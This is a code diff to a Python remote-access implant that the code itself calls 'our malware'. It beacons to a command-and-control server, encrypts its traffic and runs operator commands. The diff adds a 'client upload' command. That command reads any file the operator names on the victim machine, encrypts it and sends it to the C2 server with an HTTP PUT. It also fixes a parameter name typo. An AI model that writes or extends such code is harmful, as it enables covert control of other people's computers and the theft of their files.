@@ -3,10 +3,10 @@
 from os import chdir, getcwd, getenv, uname
 from subprocess import run, PIPE, STDOUT
 from time import sleep, time
-from requests import exceptions, get, post
+from requests import exceptions, get, post, put
 from sys import platform
 from encryption import cipher
-from settings import FILE_REQUEST, PORT, CMD_REQUEST,CWD_RESPONSE, RESPONSE, RESPONSE_KEY, C2_SERVER, DELAY, PROXY, HEADER
+from settings import FILE_REQUEST, FILE_SEND, PORT, CMD_REQUEST,CWD_RESPONSE, RESPONSE, RESPONSE_KEY, C2_SERVER, DELAY, PROXY, HEADER
 
 if getenv("OS") == "Windows_NT":
     client = getenv("USERNAME", "") + "@" + getenv("COMPUTERNAME", "") + "@" + str(time())
@@ -20,13 +20,13 @@ else:
 # UTF-8 encode the client first to be able to encrypt it, but then we must decode it after the encyption
 encrypted_client = cipher.encrypt(client.encode()).decode()
 
-def post_to_server(message: str, respone_path: str = RESPONSE):
+def post_to_server(message: str, response_path: str = RESPONSE):
     """ Function to encrypt data and then post it to the c2 server. Accepts a message and a response path (optional) as arguments."""
     try:
         # Byte encode the message and then encrypt it before posting
         message = cipher.encrypt(message.encode())
 
-        post(url=f"http://{C2_SERVER}:{PORT}{respone_path}", data={RESPONSE_KEY: message}, headers=HEADER, proxies=PROXY)
+        post(url=f"http://{C2_SERVER}:{PORT}{response_path}", data={RESPONSE_KEY: message}, headers=HEADER, proxies=PROXY)
     except exceptions.RequestException:
         return
 
@@ -97,6 +97,35 @@ while True:
             post_to_server("You must enter the filename to dowload.")
         except (FileNotFoundError, PermissionError, OSError):
             post_to_server(f"Unable to write {filename} to disk on {client}.\n")
+
+    # The "client upload FILENAME" command allows us to push files from the client to our c2 server
+    elif command.startswith("client upload"):
+
+        # Initialize filepath in order to get rid of an warning
+        filepath = None
+
+        try:
+            # Split out the filepath
+            filepath = command.split()[2]
+
+            # Split out the filename from the end of the filepath or if only a filename was supplied, use it
+            filename = filepath.rsplit("/", 1)[-1]
+
+            # Byte encode the filename first to be able to encrypt it, but then we must decode it after the encryption
+            encrypted_filename = cipher.encrypt(filename.encode()).decode()
+
+            print("filename: ", filename)
+            print("encrypted_filename: ", encrypted_filename)
+
+            # Read the file in and use it as the data argument for an HTTP PUT request to our c2 server
+            with open(filepath, "rb") as file_handle:
+                encrypted_file = cipher.encrypt(file_handle.read())
+                put(f"http://{C2_SERVER}:{PORT}{FILE_SEND}/{encrypted_filename}", data=encrypted_file, stream=True, proxies=PROXY, headers=HEADER)
+        
+        except IndexError:
+            post_to_server("You must enter the filepath to upload.")
+        except (FileNotFoundError, PermissionError, OSError):
+            post_to_server(f"Unable to access {filepath} on {client}.\n")
 
     # The "client kill" command will shut down our malware; make sure we have persistance!
     elif command.startswith("client kill"):
